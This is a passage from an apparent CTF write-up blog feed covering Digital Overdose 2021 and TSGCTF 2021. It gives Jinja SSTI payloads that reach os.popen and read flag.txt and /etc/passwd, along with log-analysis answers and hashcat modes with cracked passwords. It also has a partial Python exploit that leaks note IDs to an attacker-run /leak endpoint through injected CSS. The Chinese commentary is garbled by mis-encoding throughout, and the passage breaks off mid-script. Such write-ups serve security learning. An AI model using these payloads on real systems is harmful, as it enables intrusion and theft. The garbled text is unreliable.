&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">madlib&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;This madlib only takes five words&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/app/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹åˆ°äº†ç†Ÿæ‚‰çš„æ¨¡æ¿æ¸²æŸ“ï¼ˆè¯­æ®µæ¥è‡ªäºŽ&lt;a href="https://www.reddit.com/user/masterhacker_bot/">u/masterhacker_bot&lt;/a>ï¼‰ï¼Œåªä¼šæ¸²æŸ“ç‰¹å®šçš„ä½ç½®ï¼Œè€Œä¸”æœ‰ä¸ªç‰¹æ®Šçš„&lt;code>{adjective}.{person}&lt;/code>&lt;/p>
&lt;p>å­˜åœ¨5ä¸ªå¯ä»¥sstiçš„åœ°æ–¹ï¼Œä½†æ˜¯é™åˆ¶æ¯ä¸€ä¸ªæ¡†å­—ç¬¦æ•°å¿…é¡»åœ¨21ä¸ªä¹‹å†…ï¼›å…¶ä¸­è¿˜æœ‰ä¸¤ä¸ªéžå¸¸ç‰¹æ®Šçš„&lt;code>{adjective}.{person}&lt;/code>è¿žäº†èµ·æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ª&lt;code>.&lt;/code>ç‚¹å·è¿žæŽ¥æˆ‘ä»¬payloadçš„é•¿åº¦&lt;/p>
&lt;p>è¿™æ ·ç›¸å½“äºŽæœ‰4ä¸ªå¯ä»¥æž„é€ çš„åœ°æ–¹ï¼Œå‰ä¸¤ä¸ªç”¨æ¥å°†é•¿é•¿çš„payloadç”¨çŸ­çš„å˜é‡åŠé€†è¡Œæ›¿æ¢ï¼Œç¬¬ä¸‰ä¸ªæ˜¯payloadæœ¬ä½“ï¼Œç¬¬ä¸‰å’Œç¬¬å››ä¸ªä½ç½®å‡æ˜¯å›žæ˜¾ä½ï¼›é¦–å…ˆé€šè¿‡&lt;code>config.update&lt;/code>æ–¹æ³•ä¸æ–­åœ°å‘åŽå–å€¼æ¥æ‹¿åˆ°å¯ä»¥ç”¨çš„å‡½æ•°å¹¶å°†å…¶å­˜å‚¨åœ¨&lt;code>config.a&lt;/code>ä¸­ï¼Œä¹‹åŽè°ƒç”¨å®ƒæ¥rce&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{{y(a=x
__class__.__init__)}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾&lt;code>&amp;lt;function Config.__init__ at 0x7fd75dae31e0&amp;gt;&lt;/code>ï¼ŒçŽ°åœ¨æˆ‘ä»¬è®¾æ³•è°ƒç”¨å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
__globals__['os'])}}
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾&lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.6/os.py'&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
popen)}}
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾&lt;code>&amp;lt;function popen at 0x7fd75ed5a730&amp;gt;&lt;/code>ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„&lt;code>config.a&lt;/code>å°±æ˜¯&lt;code>os.popen()&lt;/code>ï¼ŒçŽ°åœ¨æ¥è°ƒç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{{y('uname -a')
read()}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾&lt;code>Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux&lt;/code>ï¼ŒæˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼ŒæŽ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œè¯»ä¸€æ³¢flag&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y('cat flag.txt')
read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;code>DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”å¾ˆå¹¸è¿çš„æ˜¯æœ€åŽæˆ‘ä»¬çš„payloadæ­£å¥½å°äºŽ21ä¸ªå­—ç¬¦ï¼Œæ˜¾ç„¶æˆ‘ä»¬è¢«é•¿åº¦é™åˆ¶äº†å‘æŒ¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰åˆ«çš„trick&lt;/p>
&lt;p>Jinjaä¸ä»…æ”¯æŒæ¨¡æ¿å†…éƒ¨çš„å˜é‡èµ‹å€¼è¿˜æ”¯æŒ&lt;code>~&lt;/code>è¿›è¡Œå­—ç¬¦ä¸²çš„è¿žæŽ¥ï¼Œå†åˆ©ç”¨ä¸Š&lt;code>config.command&lt;/code>ç”šè‡³èƒ½è¯»å‡º/etc/passwd&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{%set p='cat /etc'%}
{%set q=p~'/passw'%}
{{y(b=q~'d')}}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{%set z=config.b%}
{{z}}
{{y(z).read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211021172308541.png" alt="image-20211021172308541">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://anakint.medium.com/digital-overdose-2021-autumn-ctf-writeup-madlib-web-c51c5ded5260">Digital Overdose 2021 Autumn CTF Writeup â€” madlib (web)&lt;/a>&lt;/p>
&lt;h2 id="log-analysispart1---ingress">Log Analysis/Part1 - Ingress&lt;/h2>
&lt;blockquote>
&lt;p>Our website was hacked recently and the attackers completely ransomwared our server!&lt;/p>
&lt;p>We&amp;rsquo;ve recovered it now, but we don&amp;rsquo;t want it to happen again.&lt;/p>
&lt;p>Here are the logs from before the attack, can you find out what happened?&lt;/p>
&lt;/blockquote>
&lt;p>ç»™å‡ºäº†è®¿é—®æ—¥å¿—ï¼Œæœ‰åºžå¤§çš„æ•°æ®ï¼Œnè¡Œ~~ï¼Œä½†æ˜¯ä¸å¤ªä¼šçœ‹~~&lt;/p>
&lt;p>åœ¨37557è¡Œå‡ºçŽ°äº†è®¿é—®&lt;code>/ywesusnz cmd%3Dcd+..&lt;/code>ï¼Œå¾€åŽè¿˜æœ‰ä¸€äº›ywesusnzå¼€å¤´çš„ï¼Œ37629è¡Œå‡ºçŽ°äº†&lt;code>/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==&lt;/code>ï¼Œb64è§£å¯†&lt;/p>
&lt;p>&lt;code>DO{better_remove_that_backdoor}&lt;/code>&lt;/p>
&lt;h2 id="log-analysispart-2---investigation">Log Analysis/Part 2 - Investigation&lt;/h2>
&lt;blockquote>
&lt;p>Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don&amp;rsquo;t understand how the attacker found it so quickly.&lt;/p>
&lt;p>We suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?&lt;/p>
&lt;p>Please submit the attackers IP as the flag as follow, DO{x.x.x.x}&lt;/p>
&lt;/blockquote>
&lt;p>ä»ç„¶æ˜¯ç»™å‡ºäº†å¾ˆå¤šè¡Œçš„æ—¥å¿—&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022081303705.png" alt="image-20211022081303705">&lt;/p>
&lt;p>å‘çŽ°äº†å¯ç–‘çš„å†…å®¹&lt;code>DO{45.85.1.176}&lt;/code> ä½†æ˜¯æäº¤flagé”™è¯¯&lt;/p>
&lt;p>ï¼ˆç„¶åŽå‘çŽ°æ˜¯å¾ˆå‚»é€¼çš„æŠŠ200.13.84.124å½“ä½œflagäº¤äº†â€¦â€¦&lt;/p>
&lt;h2 id="log-analysispart-3---backup-policy">Log Analysis/Part 3 - Backup Policy&lt;/h2>
&lt;blockquote>
&lt;p>So it looks like the attacker scanned our site for old backups right? Did he get one?&lt;/p>
&lt;/blockquote>
&lt;p>æŽ¥ç€æ‰¾ï¼Œå‘çŽ°äº†/backup.zipçš„è¯·æ±‚æ˜¯200ok&lt;/p>
&lt;p>ä½†æ˜¯äº¤flagçš„æ—¶å€™ä¸çŸ¥é“äº¤å•¥ï¼Œçœ‹äº†wpæ‰å‘çŽ°è—åœ¨äº†UAå¤´é‡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36
&lt;/code>&lt;/pre>&lt;p>å°†ä¸­é—´é‚£ä¸€ä¸²b64è§£å¯†åŽå¾—åˆ°&lt;/p>
&lt;p>&lt;code>DO{s3cr3t___agent}&lt;/code>&lt;/p>
&lt;h2 id="source-analysisa1---c-nanigans">Source Analysis/A1 - C-nanigans&lt;/h2>
&lt;blockquote>
&lt;p>Find the flag parts in the source code, assemble the flag, submit the flag.&lt;/p>
&lt;p>(This code may not compile, and it is useless to attempt to do so)&lt;/p>
&lt;/blockquote>
&lt;p>æç¤ºæˆ‘ä»¬å…³æ³¨æºç è€Œä¸æ˜¯ç¼–è¯‘&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084007781.png" alt="image-20211022084007781">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022083958098.png" alt="image-20211022083958098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084018091.png" alt="image-20211022084018091">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084123654.png" alt="image-20211022084123654">&lt;/p>
&lt;pre tabindex="0">&lt;code>444f7b
733075526333
5f406e616c79333173
7d
&lt;/code>&lt;/pre>&lt;p>hexè§£å¯†åŽå¾—åˆ°&lt;code>DO{s0uRc3_@naly31s}&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-1">Hash Cracking/Hash 1&lt;/h2>
&lt;pre tabindex="0">&lt;code>54a09c22fc0d1af44865e411ff6e8d50
&lt;/code>&lt;/pre>&lt;p>&lt;code>phantomlover&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-2">Hash Cracking/Hash 2&lt;/h2>
&lt;pre tabindex="0">&lt;code>52ed4b109a2662fdf15edfd95632667869fc5802
&lt;/code>&lt;/pre>&lt;p>&lt;code>fishchips&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-3">Hash Cracking/Hash 3&lt;/h2>
&lt;pre tabindex="0">&lt;code>550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81
&lt;/code>&lt;/pre>&lt;p>&lt;code>mommadobbins&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-4">Hash Cracking/Hash 4&lt;/h2>
&lt;pre tabindex="0">&lt;code>451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://md5hashing.net/hash_type_checker">Hash Identifier&lt;/a>&lt;/p>
&lt;p>hashcat -m 6900 ghost&lt;/p>
&lt;p>&lt;code>happyfamily&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-5">Hash Cracking/Hash 5&lt;/h2>
&lt;pre tabindex="0">&lt;code>$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6
&lt;/code>&lt;/pre>&lt;p>hashcat -m 3200 bcrypt&lt;/p>
&lt;p>&lt;code>cowabunga&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-6">Hash Cracking/Hash 6&lt;/h2>
&lt;pre tabindex="0">&lt;code>$1$veryrand$QetWu27IoJ2FFSG30xKAQ.
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer&lt;/a>&lt;/p>
&lt;p>hashcat -m 500 MD5-Crypt&lt;/p>
&lt;p>&lt;code>scottiebanks&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-7">Hash Cracking/Hash 7&lt;/h2>
&lt;pre tabindex="0">&lt;code>$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1
&lt;/code>&lt;/pre>&lt;p>hashcat -m 1800 sha512crypt $6$&lt;/p>
&lt;p>&lt;code>igetmoney&lt;/code>&lt;/p>
&lt;hr>
&lt;p>å¾ˆæ°´çš„wpï¼Œæˆ–è€…è¯´æ˜¯å¤çŽ°ï¼Œæ²¡æœ‰ä»€ä¹ˆå‚è€ƒä»·å€¼ï¼›æŒºæœ‰æ„æ€çš„é¢˜ï¼Œå­¦åˆ°äº†sstiçš„æ–°trickï¼›Source Analysisçš„å‰©ä¸‹ä¸¤ä¸ªé¢˜å…¨æ˜¯web+reverse/crypto/pwnï¼ˆæŒ‡è·¯wp: &lt;a href="https://lo0l.com/2021/10/11/digitaloverdose.html#source-analysis---boris">Boris&lt;/a> | &lt;a href="https://github.com/maulvialf/CTF-Writeups/tree/main/2021/004-digitaloverdose/source-analysis/c1-i_think_this_should_be_c4">I think this could be C4&lt;/a>ï¼‰ï¼Œè°¢è°¢ï¼Œå®Œå…¨çœ‹ä¸æ‡‚ï¼Œå·²ç»è·ªäº†&lt;/p>
&lt;p>webç‹—æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡æ­»è·¯ä¸€æ¡&lt;/p>
&lt;p>ðŸ˜…&lt;/p></description></item><item><title>TSGCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</link><pubDate>Mon, 04 Oct 2021 16:44:41 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/</guid><description>&lt;p>&lt;a href="https://score.ctf.tsg.ne.jp/challenges">https://score.ctf.tsg.ne.jp/challenges&lt;/a> | &lt;a href="https://ctftime.org/event/1431/tasks/">https://ctftime.org/event/1431/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webwelcome-to-tsg-ctf">Web/Welcome to TSG CTF!&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>We want to welcome you,&lt;/strong> &lt;em>seriously.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004010601885.png" alt="image-20211004010601885">&lt;/p>
&lt;p>æŠ“åŒ…åŽå‘çŽ°æˆ‘ä»¬è¾“å…¥çš„å€¼æ˜¯postçš„jsonä¸­çš„keyéƒ¨åˆ†è€Œä¸æ˜¯valueï¼Œå¾ˆå¥‡æ€ª&lt;/p>
&lt;p>ç»™äº†æºç ï¼Œçœ‹ä¸‹app.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004083305948.png" alt="image-20211004083305948">&lt;/p>
&lt;p>11è¡Œæœ‰ä¸ªæ¯”è¾ƒï¼Œè¦é€šè¿‡å®ƒï¼Œå¯ä»¥æŠŠbodyç½®ç©ºè®¿é—®ï¼ˆç”¨burpçš„è¯è¦æ”¹ä¸€ä¸‹Content-Typeï¼Œé»˜è®¤çš„application/jsonæ˜¯ä¸èƒ½ç½®ç©ºçš„ï¼‰ï¼Œ&lt;code>typeof null === 'object'&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl &lt;span style="color:#d88200">&amp;#34;http://34.84.69.72:34705/&amp;#34;&lt;/span> -X POST
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;statusCode&amp;#34;&lt;/span>:500,&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Internal Server Error&amp;#34;&lt;/span>,&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>:&lt;span style="color:#d88200">&amp;#34;Cannot read property &amp;#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&amp;#39; of null&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flagä¼šåœ¨æŠ¥é”™ä¸­å‡ºçŽ°ï¼&lt;/p>
&lt;p>&lt;code>TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}&lt;/code>&lt;/p>
&lt;h2 id="webudon">Web/Udon&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Ta-dah! Here comes udon!&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>Udon Noteï¼Œä¸€çœ¼xssä¹‹ç±»çš„&lt;/p>
&lt;p>æˆ‘ä»¬å‘å‡ºåŽ»çš„noteä¸­çš„å°–æ‹¬å·ä¼šè¢«è½¬ä¹‰ä¸ºå®žä½“å­—ç¬¦ï¼ŒResetä¼šæ¸…ç©ºcookieï¼Œè¿žå¸¦ç€æ¶ˆå¤±ä¹‹å‰å‘å¸ƒè¿‡çš„Note&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004080116886.png" alt="image-20211004080116886">&lt;/p>
&lt;p>æœ‰Tell Admin About This Udon Noteçš„é€‰é¡¹&lt;/p>
&lt;p>â€”â€”â€”â€”æ²¡ä»€ä¹ˆæƒ³æ³• ä»¥ä¸‹æ˜¯å¹³æ·¡çš„å¤çŽ°è¿‡ç¨‹&lt;/p>
&lt;p>çœ‹æºç ï¼Œmain.go&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155626744.png" alt="image-20211004155626744">&lt;/p>
&lt;p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°é‚£ä¸ªç‰¹æ®Šçš„notes_id&lt;/p>
&lt;p>æŽ¥ç€å¾€ä¸‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004155826973.png" alt="image-20211004155826973">&lt;/p>
&lt;p>httpçš„ç›¸åº”å¤´å¯ä»¥æ³„éœ²ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæ˜¯å…¥æ‰‹ç‚¹&lt;/p>
&lt;p>ä»…åœ¨Firefoxä¸­æœ‰ä¸€ä¸ª&lt;code>Link&lt;/code>è¯·æ±‚å¤´ï¼Œå‡ ä¹Žç­‰åŒäºŽHTMLä¸­çš„&lt;code>&amp;lt;link&amp;gt;&lt;/code>æ ‡ç­¾&lt;/p>
&lt;pre tabindex="0">&lt;code>Link: &amp;lt;/foo.css&amp;gt;; rel=&amp;quot;stylesheet&amp;quot;; type=&amp;quot;text/css&amp;quot;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;/foo.css&amp;quot;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬å¯ä»¥å‘appä¸­çš„ä»»æ„ä¸€é¡µæ³¨å…¥ä»»æ„çš„css&lt;/p>
&lt;p>åŒæ—¶ä¹Ÿæœ‰éœ€è¦Bypassçš„åœ°æ–¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„CSPç­–ç•¥&lt;code>style-src 'self'&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004160452260.png" alt="image-20211004160452260">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ¶æ„cssçš„noteï¼Œå†å°†è¿™ä¸ªnoteçš„é“¾æŽ¥æ”¾å…¥&lt;code>Link&lt;/code>è¯·æ±‚å¤´ä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>http://ip:port/?k=Link&amp;amp;v=%3C%2F(&amp;lt;URL of a note with styles to inject&amp;gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># exp.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">TARGET_BASE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://localhost:8080&amp;#34;&lt;/span>
&lt;span style="color:#111">LEAK_LENGTH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>
&lt;span style="color:#111">CHAR_CANDIDATES&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_letters&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span>
&lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://host.docker.internal:1337&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_payload&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;List[str]&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;EXPLOIT_BASE_ADDR is not set&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">candidate&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">candidates&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">id_prefix_to_try&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">candidate&lt;/span>
&lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">lambda&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:],&lt;/span> &lt;span style="color:#d88200">&amp;#39;/notes/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;a[href^=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">matcher&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;] { background-image: url(&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">EXPLOIT_BASE_ADDR&lt;/span> &lt;span style="color:#f92672">+&lt;/span> \
&lt;span style="color:#d88200">&amp;#34;/leak?q=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">id_prefix_to_try&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;); }&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">post_note&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">description&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">:&lt;/span>
